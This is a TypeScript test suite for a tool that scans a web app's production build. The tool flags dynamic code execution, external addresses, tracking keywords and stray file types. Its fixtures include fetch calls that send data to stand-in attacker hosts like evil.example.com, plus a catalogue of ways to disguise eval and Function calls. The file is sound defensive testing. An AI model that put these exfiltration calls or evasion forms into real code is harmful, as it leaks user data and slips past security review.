import type { ArtifactPolicy } from './artifacts.ts'
import { describe, expect, it } from 'vitest'
import { checkFileTypes, checkTestOnlyArtifacts, classifyArtifact, scanArtifacts } from './artifacts.ts'
import { ARTIFACT_POLICY } from './policy.ts'

const policy: ArtifactPolicy = {
  ...ARTIFACT_POLICY,
  allowedAddresses: [
    { address: 'http://www.w3.org/2000/svg', source: '样例', reason: 'SVG 的命名空间' },
    { address: 'http://www.w3.org/1999/xhtml', source: '样例', reason: 'XHTML 的命名空间' },
    { address: 'http://localhost', source: '样例', reason: '解析相对地址的基准' },
  ],
  globalThisProbeMax: 1,
}

function scan(content: string, path = 'assets/index.js') {
  return scanArtifacts([{ path, content }], policy)
}

function rules(content: string, path = 'assets/index.js'): string[] {
  return scan(content, path).violations.map(v => v.rule)
}

describe('US-M1-11 A01 产物扫描：动态代码', () => {
  it.each([
    ['eval(', 'eval("1+1")'],
    ['可选调用的 eval', 'eval?.(code)'],
    ['间接 eval', '(0, eval)("x")'],
    ['逗号表达式里的 eval', '(1,eval)(code)'],
    ['globalThis.eval', 'globalThis.eval(code)'],
    ['window.eval', 'window.eval(code)'],
    ['Worker 里的 self.eval', 'self.eval(code)'],
    ['用下标取 eval', 'window["eval"](code)'],
    ['new Function', 'new Function("return 1")'],
    ['new window.Function', 'new window.Function("x")'],
    ['不带 new 的 Function，参数是变量', 'var f=Function(code)();'],
    ['不带 new 的 Function，多个参数', 'Function(a,b)'],
    ['字符串 Function', 'Function("a","return a")'],
    ['经 constructor 取到 Function', '(function(){}).constructor("return 1")()'],
    ['字符串定时器', 'setTimeout("alert(1)", 10)'],
    ['字符串 setInterval', 'setInterval(\'tick()\', 10)'],
    ['window.setTimeout 的字符串参数', 'window.setTimeout("alert(1)",1)'],
    ['WebAssembly', 'WebAssembly.instantiate(bytes)'],
    ['用下标访问 WebAssembly', 'WebAssembly["instantiate"](b)'],
    ['内联 Worker（Blob）', 'new Worker(URL.createObjectURL(new Blob([atob(s)],{type:"text/javascript"})))'],
    ['内联 Worker（data URL）', 'new Worker("data:text/javascript;base64,AAAA")'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/dynamic-code')
  })

  it.each([
    ['先把 Function 赋给变量再 new（zod 源码里的写法）', 'let F=Function;new F(code)'],
    ['先把 Function 赋给变量再调用', 'const F=Function;F(code)()'],
    ['全局对象上的 Function 赋给变量', 'const F=globalThis.Function;F(code)()'],
    ['Reflect.construct 的参数', 'Reflect.construct(Function,[code])'],
    ['Function 的 apply', 'Function.apply(null,[code])'],
    ['eval 赋给变量', 'const e=eval;e(code)'],
    ['标签模板', 'Function`return 1`'],
    ['标识符里的转义', '\\u0065val(code)'],
  ])('违规（审查 B3）：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/dynamic-code')
  })

  it('没有语法树的文本文件（HTML 等）仍按写法匹配 eval 与 Function', () => {
    expect(rules('<script>eval(x)</script>', 'index.html')).toContain('artifacts/dynamic-code')
    expect(rules('<svg onload="new Function(x)()"></svg>', 'assets/logo.svg')).toContain('artifacts/dynamic-code')
    expect(rules('<p>Function("return this")</p>', 'index.html')).toEqual([])
  })

  it('违规：JS 文件解析失败时不当作没有动态代码', () => {
    expect(rules('let x = ;')).toEqual(['artifacts/unparsable'])
  })

  it('合规：常见的正常写法不误报', () => {
    const code = [
      // 任何对象上名为 eval、Function 的属性都算引用（复验 R5），这里只有名字相近的
      'a.evaluate(x);b.myFunction("x");obj.eval2=1;isFunction("x");',
      'typeof f==="function";x instanceof Function;Function.prototype.call.bind(f);',
      'const tag="[object Function]";const kinds=["AsyncFunction","GeneratorFunction"];',
      'setTimeout(fn,0);self.setTimeout(()=>{},1);',
      'new Worker(new URL("./formula.worker-abc.js",import.meta.url),{type:"module"});',
      'var s="//";var t="a//b";',
    ].join('\n')
    expect(rules(code)).toEqual([])
  })

  it('合规：全局对象探测在允许的次数以内；超过即违规', () => {
    expect(rules('var g=Function("return this")();')).toEqual([])
    expect(rules('Function("return this")();Function(\'return this\')();')).toEqual(['artifacts/global-this-probe'])
  })

  it('已登记的 zod JIT 探测（空字符串的 Function）：次数以内不算动态代码，超过上限即违规；带内容的、先赋给变量的仍是动态代码', () => {
    expect(rules('var L=jo(()=>{if(zs.jitless)return!1;try{return Function(``),!0}catch{return!1}})')).toEqual([])
    expect(rules('Function(``);Function(\'\')')).toEqual(['artifacts/known-dynamic-code'])
    expect(rules('Function(`x`)')).toContain('artifacts/dynamic-code')
    expect(rules('new Function(``+code)')).toContain('artifacts/dynamic-code')
    // 登记的是压缩后的原文 Function(``)；源码里先赋给变量的写法不在登记范围里（审查 B3）
    expect(rules('const F=Function;try{new F("")}catch{}')).toContain('artifacts/dynamic-code')
  })

  // 生产产物里 zod 的 Doc.compile 原文（压缩后）；样例是产物原文，不是要插值
  // eslint-disable-next-line no-template-curly-in-string
  const zodCompiler = 'var pl=class{compile(){let e=Function,t=this?.content??[``];return new e(...Object.keys(this.closed),`return function (${this.args.join(`, `)}) {\\n${t.join(`\n`)}\\n};`)(...Object.values(this.closed))}};'

  it('已登记的 zod JIT 编译器：原文以内不算动态代码，并计数；出现两次即违规；别处把 Function 赋给变量仍然违规', () => {
    const scan = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], policy)
    expect(scan.violations).toEqual([])
    expect(scan.knownDynamicCode).toEqual(new Map([['zod 的 JIT 探测', 0], ['zod 的 JIT 编译器', 1]]))
    expect(rules(zodCompiler + zodCompiler.replace('pl=', 'pm='))).toEqual(['artifacts/known-dynamic-code'])
    expect(rules('var pl=class{compile(){let e=Function;return e(this.code)}};')).toContain('artifacts/dynamic-code')
  })

  it('没有登记时，zod 的 JIT 编译器报为动态代码（审查 B3：P1 起漏检）', () => {
    const unregistered = { ...policy, knownDynamicCode: policy.knownDynamicCode.filter(known => known.name !== 'zod 的 JIT 编译器') }
    const { violations } = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], unregistered)
    expect(violations.map(v => v.rule)).toEqual(['artifacts/dynamic-code'])
    expect(violations[0]?.detail).toContain('let e=Function')
  })
})

describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
  it.each([
    ['https', 'fetch("https://evil.example.com/collect?x=1")'],
    ['大写的协议', 'fetch("HTTPS://EVIL.EXAMPLE.COM/x")'],
    ['wss', 'new WebSocket("wss://t.example.com/s")'],
    ['协议相对地址', 'fetch("//evil.example.com/collect")'],
    ['JSON 转义的斜杠', 'JSON.parse("{\\"u\\":\\"https:\\\\/\\\\/evil.example.com\\"}")'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/address')
  })

  it('违规：CSS 里的外部地址', () => {
    expect(rules('body{background:url(https://cdn.example.net/bg.png)}', 'assets/x.css')).toEqual(['artifacts/address'])
  })

  it('违规：解析不了的主机照样报出，原样记进主机汇总', () => {
    const result = scan('fetch("https://exa%mple.com/x")')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['exa%mple.com'])
  })

  // 以下样例都是产物里的模板字符串原文，不是要插值
  /* eslint-disable no-template-curly-in-string */
  it.each([
    ['查询里的插值', 'fetch(`https://tracker.example.com/collect?u=${user}`)', 'tracker.example.com'],
    ['路径里的插值', 'img.src=`https://evil.example/${id}.gif`', 'evil.example'],
    ['WebSocket 路径里的插值', 'new WebSocket(`wss://t.example.com/s/${room}`)', 't.example.com'],
    ['主机以插值开头、后面是固定的域名', 'fetch(`https://${region}.tracker.example.com/e`)', '*.tracker.example.com'],
    ['用户信息是插值、主机固定', 'fetch(`https://${key}@o1.ingest.example.io/1`)', 'o1.ingest.example.io'],
  ])('违规（审查 B2）：主机固定、插值在后面时，按主机检查：%s', (_case, code, host) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual([host])
  })

  it('合规：主机本身在运行时拼出（插值紧跟在 // 或 //[ 之后），看不到主机，由 CSP 兜底，单独计数', () => {
    const result = scan('function Ul(e){return Sl(`http://[${e}]`)};const u=`https://${host}/x`;const w=`wss://${host}:${port}/ws`')
    expect(result.violations).toEqual([])
    expect(result.hosts).toEqual(new Map())
    expect(result.runtimeHosts).toBe(3)
  })

  it('违规：主机或端口里有插值时，允许清单不适用（实际的地址不止这段固定部分）', () => {
    expect(rules('const a=`http://localhost${suffix}`')).toEqual(['artifacts/address'])
    expect(rules('const a=`http://localhost:${port}`')).toEqual(['artifacts/address'])
  })

  it('合规：允许清单里的地址后面拼上路径（与字符串拼接的写法一样）', () => {
    const code = 'function n(e){return`https://react.dev/errors/${e}`}function m(e){return`https://react.dev/errors/`+e}'
    expect(scanArtifacts([{ path: 'assets/index.js', content: code }], ARTIFACT_POLICY).violations).toEqual([])
  })
  /* eslint-enable no-template-curly-in-string */

  it('合规：允许清单里的地址（协议与主机不区分大小写，句末的句点不算，JSON 转义的斜杠也认得）', () => {
    expect(rules('const ns="http://www.w3.org/2000/svg";const x="HTTP://WWW.W3.ORG/1999/xhtml";const m="See http://localhost."')).toEqual([])
    expect(rules('const j="{\\"ns\\":\\"http:\\\\/\\\\/www.w3.org\\\\/2000\\\\/svg\\"}"')).toEqual([])
  })

  it.each([
    ['同一个主机上的其他地址', 'fetch("http://www.w3.org/collect?id=1")'],
    ['协议不同', 'const ns="https://www.w3.org/2000/svg"'],
    ['路径区分大小写', 'const ns="http://www.w3.org/1999/XHTML"'],
    ['登记的地址后面加上路径', 'fetch("http://localhost/api/collect")'],
    ['登记的地址加上端口', 'fetch("http://localhost:8080")'],
  ])('违规（审查 B21）：按具体地址放行，不按主机：%s', (_case, code) => {
    expect(rules(code)).toEqual(['artifacts/address'])
  })

  it.each(['Sentry.init({dsn:d})', 'new PostHog()', 'o.license_key="x"', 'o.licenseKey="x"', 'import("@univerjs-pro/license")', 'https://www.googletagmanager.com/gtag/js'])('违规：关键字（不区分大小写）%s', (code) => {
    expect(rules(code)).toContain('artifacts/keyword')
  })

  it('汇总出现过的主机与允许清单里这次没出现的地址，便于审查允许清单', () => {
    const result = scan('a="http://www.w3.org/1999/xhtml";b="http://www.w3.org/2000/svg"')
    expect(result.hosts).toEqual(new Map([['www.w3.org', 2]]))
    expect(result.unusedAddresses).toEqual(['http://localhost'])
  })

  it('真实的允许清单：每一项都是合法的绝对地址，写明来源与用途，没有重复', () => {
    const { allowedAddresses } = ARTIFACT_POLICY
    for (const entry of allowedAddresses) {
      expect(() => new URL(entry.address), entry.address).not.toThrow()
      expect(entry.source.length > 0 && entry.reason.length > 0, entry.address).toBe(true)
    }
    expect(new Set(allowedAddresses.map(entry => entry.address.toLowerCase())).size).toBe(allowedAddresses.length)
  })
})

describe('US-M1-11 A01 产物的文件类型', () => {
  it('合规：已登记的类型与三个清单文件', () => {
    expect(checkFileTypes(['index.html', 'assets/index-a.js', 'assets/x.css', 'assets/f.woff2', 'assets/logo.svg', 'config.json', 'THIRD-PARTY-LICENSES.md', '.vite/manifest.json', '.vite/third-party-packages.json'])).toEqual([])
  })

  it.each(['assets/x.wasm', 'assets/app.js.map', 'assets/data.bin', 'README', 'notes.md', 'docs/THIRD-PARTY-LICENSES.md'])('违规：未登记的类型或位置 %s', (path) => {
    expect(checkFileTypes([path]).map(v => v.rule)).toEqual(['artifacts/file-type'])
  })

  it('清单文件不扫描内容，其他 .json 按文本扫描', () => {
    expect(classifyArtifact('THIRD-PARTY-LICENSES.md')).toBe('metadata')
    expect(classifyArtifact('.vite/manifest.json')).toBe('metadata')
    expect(classifyArtifact('config.json')).toBe('text')
  })
})

describe('US-M1-09 生产构建里没有测试构建的文件', () => {
  it('CSP 探针的页面与 Worker 出现在生产构建里即违规', () => {
    expect(checkTestOnlyArtifacts(['index.html', 'assets/index-abc.js']).map(v => v.subject)).toEqual([])
    expect(checkTestOnlyArtifacts(['csp-probe.html', 'assets/csp-probe-B7Lc.js', 'assets/probe-worker-CtLd.js', 'assets/index-abc.js']).map(v => v.subject))
      .toEqual(['csp-probe.html', 'assets/csp-probe-B7Lc.js', 'assets/probe-worker-CtLd.js'])
  })
})
